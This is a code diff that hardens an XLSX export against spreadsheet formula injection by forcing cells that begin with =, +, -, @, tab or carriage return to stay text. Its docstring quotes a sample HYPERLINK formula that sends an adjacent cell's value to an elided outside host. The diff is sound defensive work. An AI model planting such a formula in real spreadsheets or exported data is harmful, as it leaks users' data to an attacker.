@@ -287,7 +287,26 @@ async def export_data_xlsx(
     wb = Workbook()
     wb.remove(wb.active)
 
+    # Characters that make Excel treat a cell as a formula rather than text.
+    # A leading "-" is included because "-1+1" is arithmetic to Excel, and a
+    # tab or carriage return can smuggle one of the others to the front.
+    FORMULA_STARTERS = ("=", "+", "-", "@", "\t", "\r")
+
     def add_sheet(title, headers, rows, money_cols=()):
+        """One sheet, with every text cell forced to stay text.
+
+        A description is user data, and some of it arrives from outside: a
+        bank narration, an imported statement, a payee name off a payment
+        alert. openpyxl stores a string beginning with "=" as a FORMULA -
+        verified, data_type 'f' - so a description of
+        `=HYPERLINK("http://.../?"&A1,"CLICK")` becomes live in the workbook
+        and fires the moment the owner opens their own export, sending the
+        neighbouring cell to whoever wrote it.
+
+        The value is not altered - no apostrophe is prepended, so the export
+        still reads exactly as the ledger does. The cell type is simply
+        pinned to string, which is what it always should have been.
+        """
         ws = wb.create_sheet(title)
         ws.append(headers)
         for cell in ws[1]:
@@ -296,6 +315,9 @@ async def export_data_xlsx(
             cell.alignment = Alignment(vertical="center")
         for row in rows:
             ws.append(row)
+            for cell in ws[ws.max_row]:
+                if isinstance(cell.value, str) and cell.value.startswith(FORMULA_STARTERS):
+                    cell.data_type = "s"
         for idx in money_cols:
             for cell in ws[get_column_letter(idx)][1:]:
                 cell.number_format = money_format
